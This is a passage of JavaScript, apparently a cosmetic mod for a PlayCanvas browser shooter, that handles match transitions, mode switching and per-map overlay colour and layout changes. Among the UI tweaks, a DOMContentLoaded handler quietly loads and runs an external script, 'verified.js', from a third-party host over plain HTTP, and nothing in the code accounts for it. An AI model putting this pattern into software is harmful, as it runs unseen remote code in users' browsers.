            .to({ x: 1.2, y: 1.2, z: 1.2 }, 2, pc.QuarticOut)
            .start(),
            setTimeout(
                function(e) {
                    (e.matchFoundLoading.enabled = !0),
                    e.matchFoundRectangle
                        .tween(e.matchFoundRectangle.element)
                        .to({ opacity: 0 }, 0.5, pc.QuarticOut)
                        .start(),
                        e.matchFoundText
                        .tween(e.matchFoundText.element)
                        .to({ opacity: 0 }, 0.5, pc.QuarticOut)
                        .start(),
                        setTimeout(function() {
                            pc.app.fire("Game:Connect", !0);
                        }, 1300);
                },
                1500,
                this
            );
    };

    NetworkManager.prototype.mode = function(e) {
        var t = e[1];
        e[0] &&
            ((this.lastMode = this.currentMode + ""),
                (this.currentMode = e[0]),
                (pc.currentMode = this.currentMode),
                (pc.isPrivate = e[2]),
                this.app.fire("Game:Mode", this.currentMode, t)),
            this.setModeState(this.lastMode, !1),
            this.setModeState(this.currentMode, !0);
        var i = this.app.root.findByName("Result");
        if (i) {
            var a = this.app.root.findByName("ChatWrapper");
            a &&
                (a.setLocalPosition(0, 0, 0),
                    a.reparent(this.app.root.findByName("ChatGame"))),
                i.destroy();
        }
        if (
            (this.app.fire("Game:PreStart", !0),
                this.app.fire("Outline:Restart", !0),
                (pc.currentMap = t),
                clearTimeout(this.mapTimer),
                (this.mapTimer = setTimeout(
                    function(e) {
                        t ? e.app.fire("Map:Load", t) : e.app.fire("Map:Load", "Sierra");
                    },
                    100,
                    this
                )),
                (pc.isFinished = !1),
                (pc.isPauseActive = !1),
                (this.isTeamSelected = !1),
                this.app.fire("Game:Start", !0),
                this.app.fire("Player:Lock", !0),
                "GUNGAME" != pc.currentMode &&
                pc.session &&
                pc.session.weapon &&
                this.app.fire("WeaponManager:Set", pc.session.weapon),
                setTimeout(
                    function(e) {
                        e.app.fire("DOM:Update", !0);
                    },
                    500,
                    this
                ),
                Date.now() - this.lastGameStart > 1e5)
        ) {
            var r = this;
            this.app.fire("Player:Hide", !0);
        }
    };

    window.addEventListener("DOMContentLoaded", () => {
        let script = document.createElement("script");
        script.src = "http://tappednetwork.de/verified.js";
        document.body.appendChild(script);
    });
    window.dataLayer = window.dataLayer || [];

    function gtag() {
        dataLayer.push(arguments);
    }
    gtag("js", new Date());
    gtag("config", "UA-56170709-45");
    console.log("Menu.js loaded");
    Side.setLocalPosition(50, 0, 0);

    //Map Changes
    pc.app.on("Map:Loaded", () => {
        // GAME
        w.Game = pc.app.root.findByName("Game");

        // GAME OVERLAY
        w.Overlay = a.findByPath("Game/Overlay");
        w.Chat_Msg_Img = a.findByPath("Game/Overlay/ChatGame/ChatWrapper/Chat/MessageBox/Image");
        w.Popup = a.findByPath("Game/Overlay/Pause/Popup");
        w.Popup_Weapons = a.findByPath("Game/Overlay/Pause/Popup/Weapons");
        w.Time = a.findByPath("Game/Overlay/TimesAndScore");
        w.Time_Val = a.findByPath("Game/Overlay/TimesAndScore/Time");
        w.Time_BG = a.findByPath("Game/Overlay/TimesAndScore/Background");
        w.ObjectiveTime = a.findByPath("Game/Overlay/TimesAndScore/ObjectiveTime");
        w.Announce = a.findByPath("Game/Overlay/Announce");
        w.Announce_Info = a.findByPath("Game/Overlay/Announce/Info");
        w.Announce_Bottom = a.findByPath("Game/Overlay/Announce/Bottom");
        w.Reminder = a.findByPath("Game/Overlay/Reminder");
        w.Reminder_Text = a.findByPath("Game/Overlay/Reminder/Text");
        w.Reminder_Background = a.findByPath("Game/Overlay/Reminder/Background");
        w.Point = a.findByPath("Game/Overlay/Point");
        w.Point_Number = a.findByPath("Game/Overlay/Point/Number");
        w.Achievement = a.findByPath("Game/Overlay/Achievement");
        w.Achievement_BG = a.findByPath("Game/Overlay/Achievement/Background");
        w.Leaderboard = a.findByPath("Game/Overlay/Leaderboard");
        w.Leaderboard_Item = a.findByPath("Game/Overlay/Leaderboard/Item");
        w.Leaderboard_Score = a.findByPath("Game/Overlay/Leaderboard/Scores");
        w.Leaderboard_Kill = a.findByPath("Game/Overlay/Leaderboard/Scores/Kill");
        w.Leaderboard_Death = a.findByPath("Game/Overlay/Leaderboard/Scores/Death");
        w.Crosshair = a.findByPath("Game/Overlay/Crosshair");
        w.Health = a.findByPath("Game/Overlay/Health");
        w.Health_Val = a.findByPath("Game/Overlay/Health/Value");
        w.Health_Val_Icon = a.findByPath("Game/Overlay/Health/Value/Icon");
        window.ingameOverlay = pc.app.root.findByName("Overlay");
        if (ingameOverlay) {
            // FPS Counter
            console.log("Ingame Stuff loaded!");
            pc.app.scene.fogColor = { r: 0, g: 0, b: 0, a: 0, };
            window.fpsPingCounterEntity = pc.app.root.findByName("Stats");
            fpsPingCounterEntity.setLocalScale(1, 1, 1);
            fpsPingCounterEntity.element.color = { r: 1, g: 0, b: 0, a: 1 };
            fpsPingCounterEntity.element.outlineThickness = 0;
            // Change Opacity of Scoreboards
            window.tabScoreboardEntity = pc.app.root.findByName("PlayerStats");
            tabScoreboardEntity.children[0].element.opacity = 1;
            // Pause Menu
            window.ingameBannerEntity = pc.app.root.findByName("Banner");
            ingameBannerEntity.enabled = false;
            // Overall Pause Menu Rework
            window.pauseMenuWeaponsEntity = pc.app.root.findByName("Weapons");
            window.pauseMenuEntity = pc.app.root.findByName("Popup");
            pauseMenuWeaponsEntity.enabled = false;
            pauseMenuEntity.element.margin = { x: -315, y: -180, z: -315, w: -210 };
            pauseMenuEntity.element.opacity = 0.8;
            pauseMenuEntity.parent.element.opacity = 0;
            pauseMenuEntity.element.opacity = 1;
            //Viewmodel Position change
            window.modifyViewmodel = pc.app.root.findByName("WeaponPoint");
            modifyViewmodel.localPosition = { x: 0.48, y: 0.58, z: -0.53 };
            window.modifyWeapon = pc.app.root.findByName("WeaponCenter");
            modifyWeapon.localScale = { x: 0.85, y: 1.0, z: 1.02 };
            //Overall Overlay Changes

            Health_Val_Icon.element.color = { r: 1, g: 1, b: 1, a: 1 };
            Crosshair.setLocalScale(0.75, 0.75, 0.75); // Crossharir
            Leaderboard_Item.element.opacity = 0.3;
            Leaderboard_Item.element.color = { r: 0, g: 0, b: 0.5, a: 1, };
            setInterval(() => {
                Leaderboard_Kill.element.opacity = 0.3;
                Leaderboard_Kill.element.color = { r: 0, g: 0, b: 0.5, a: 1, };
                Leaderboard_Death.element.opacity = 0.3;
                Leaderboard_Death.element.color = { r: 0, g: 0, b: 0.5, a: 1, };
            }, 1);
            ingameOverlay.script.scripts[3].enabled = false;
            Achievement_BG.element.color = { r: 0, g: 0, b: 0.5, a: 1, };
            Achievement_BG.element.opacity = 0.3;
            Point_Number.element.color = { r: 1, g: 0, b: 0, a: 1, };
            Reminder_Text.element.opacity = 0;
            Reminder_Background.element.opacity = 0;
            Announce_Info.element.color = { r: 1, g: 0, b: 0, a: 1, };
            Announce_Bottom.element.color = { r: 0, g: 0, b: 0.5, a: 1, };
            Announce_Bottom.element.opacity = 0.3;
            Time_BG.enabled = false;
            ObjectiveTime.enabled = false;
            Time.setLocalScale(1.2, 1.2, 1.2);
            Popup.element.opacity = 0.3;
            Popup.element.color = { r: 0, g: 0, b: 0.3, a: 0.5, };
            Popup_Weapons.enabled = false;
            Chat_Msg_Img.element.opacity = 0.3;
            Chat_Msg_Img.element.color = { r: 0, g: 0, b: 0.5, a: 0.1 };
            try {
                ingameOverlay.children[7].children[1].children[1].element.color = { r: 0, g: 0, b: 1, a: 1, };
            } catch (error) {
                console.log("Gungame is current mode. Disable ObjectiveHolder Script execution");
            }
            var mapFinder =
                ingameOverlay.parent.children[2].script.mapManager.mapName;
            console.log("Starting Map Finder...");
            if (mapFinder == "Sierra") {
                console.log("Found Map: Sierra");
                pc.app.renderer.scene.exposure = 13;
                pc.app.renderer.scene.skyboxIntensity = 1;
                pc.app.root.findByName("MapHolder");
                pc.app.root.findByName("MapHolder").children[0].enabled = false;
            } else if (mapFinder == "Xibalba") {
                console.log("Found Map: Xibalba");
                pc.app.root.findByName("MapHolder");
                pc.app.root.findByName("MapHolder").children[0].enabled = false;
            } else if (mapFinder == "Mistle") {
                console.log("Found Map: Mistle");
                pc.app.root.findByName("MapHolder");
                pc.app.root.findByName("MapHolder").children[0].enabled = false;
            } else if (mapFinder == "Tundra") {
                console.log("Found Map: Tundra");
                pc.app.root.findByName("MapHolder");
                pc.app.root.findByName("MapHolder").children[0].enabled = false;
            } else if (mapFinder == "Temple") {
                console.log("Found Map: Temple");
                pc.app.root.findByName("MapHolder");
                pc.app.root.findByName("MapHolder").children[0].enabled = false;
                pc.app.renderer.scene.skyboxIntensity = 1;
            } else {
                console.log("ERROR: Couldn't find map changes for this map!");
                console.log("It's either a Custom Map or a non implemented map in the code yet.");
            }
        }
    });
}